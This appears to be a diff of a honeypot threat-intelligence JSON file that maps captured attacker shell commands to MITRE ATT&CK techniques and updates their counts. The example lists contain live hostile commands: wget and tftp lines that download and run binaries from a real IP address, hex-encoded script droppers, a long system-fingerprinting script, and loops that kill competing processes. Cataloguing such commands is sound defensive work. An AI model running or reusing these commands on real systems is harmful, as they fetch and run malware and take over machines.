@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -8,14 +7,14 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 75332,
-      "distinct_ips": 160,
+      "count": 75339,
+      "distinct_ips": 161,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-        "echo -e \"\\x6F\\x6B\"",
-        "echo -e \"\\x47\\x41\\x59\"",
-        "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
-        "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
+        "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
+        "/bin/busybox echo -ne \"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7D\\x0A\\x0A\" >> .k",
+        "/bin/busybox echo -ne \"\\x20\\x20\\x20\\x20\\x72\\x65\\x73\\x75\\x6C\\x74\\x3D\\x24\\x28\\x6C\\x73\\x20\\x2D\\x6C\\x20\\x22\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x65\" >> .k",
+        "/bin/busybox echo -ne \"\\x78\\x65\\x22\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x75\\x6C\\x6C\\x29\\x0A\\x0A\\x20\\x20\\x20\\x20\\x69\\x66\\x20\\x5B\\x20\\x22\\x24\\x72\\x65\" >> .k"
       ]
     },
     {
@@ -25,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 2851,
-      "distinct_ips": 169,
+      "count": 2866,
+      "distinct_ips": 170,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 )\necho \"UNAME:$uname\"\necho \"ARCH:$arch\"\necho \"UPTIME:$uptime\"\necho \"CPUS:$cpus\"\necho \"CPU_MODEL:$cpu_model\"\necho \"GPU:$gpu_info\"\necho \"LAST:$last_output\"\necho \"FILTER:$filter_output\"",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -42,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1529,
-      "distinct_ips": 152,
+      "count": 1532,
+      "distinct_ips": 153,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -76,8 +75,8 @@
         "impact"
       ],
       "url": "https://attack.mitre.org/techniques/T1489",
-      "count": 66,
-      "distinct_ips": 7,
+      "count": 76,
+      "distinct_ips": 8,
       "examples": [
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    if [ \"$result\" != \"${result%(deleted)}\" ]; then\n        kill -9 \"$pid\"\n    fi\ndone\n",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done",
@@ -180,6 +179,6 @@
       ]
     }
   ],
-  "total_commands": 201907,
-  "matched_commands": 78728
+  "total_commands": 202391,
+  "matched_commands": 78760
 }
